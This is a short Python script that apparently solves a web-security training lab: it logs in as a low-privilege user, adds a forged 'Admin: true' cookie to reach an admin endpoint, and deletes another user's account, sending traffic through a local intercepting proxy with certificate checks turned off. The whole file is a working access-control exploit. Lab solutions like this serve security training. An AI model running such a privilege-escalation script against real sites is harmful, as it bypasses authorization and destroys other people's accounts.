import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
def get_csrf_token(s, url):
    r= s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    print(csrf)
    return csrf


def delete_user(s, url):


    # get csrf token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #login as the normal user
    data = {"csrf": csrf_token,
    "username": "wiener",
    "password": "peter" }

    r= s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("successfully logged in as user")

        #Retriving session cookie
        session_cookie = r.cookies.get_dict().get('session')

        #Visit the admin panel and delete the user carlos
        delete_user_carlos_url = url + "/admin/delete?username=carlos"
        cookies = {'session': session_cookie, "Admin":"true"}
        r = requests.get(delete_user_carlos_url, cookies=cookies, verify=False, proxies=proxies)
        if r.status_code == 200:
            print('user deleted')
        else:
            print('user not deleted')
            sys.exit(-1)
    else:
        print("failed to login as user")
        sys.exit(-1)







def main():
    if len(sys.argv) != 2:
        print("Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    print("Deleting the user")
    delete_user(s, url)




if __name__ == "__main__":
    main()